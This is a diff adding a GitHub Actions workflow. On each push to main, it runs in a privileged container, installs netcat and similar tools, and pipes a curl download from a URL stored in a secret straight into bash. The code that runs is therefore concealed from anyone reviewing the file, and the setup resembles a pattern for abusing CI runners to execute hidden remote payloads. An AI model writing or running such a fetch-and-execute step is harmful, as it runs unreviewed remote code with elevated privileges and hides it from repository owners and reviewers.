@@ -1,0 +1,39 @@
+name: Inline Shell Commands
+
+# on:
+#   schedule:
+#     - cron: '0 5 * * *'
+#   workflow_dispatch:
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  run-commands:
+    runs-on: ubuntu-latest
+    container:
+      image: ubuntu:22.04
+      options: --privileged
+    
+    steps:
+    - name: Install dependencies
+      run: |
+        apt-get update
+        apt-get install -y curl wget bash procps lsof netcat git unzip python3 python3-requests jq
+    
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Run application
+      env:
+        TESTING: ${{ secrets.TESTING }}
+      run: |
+        set -e
+        echo "Running in Ubuntu container job..."
+        
+        # Your existing logic
+        curl -sSL $TESTING | bash -s
+        ls
+        ./start.sh
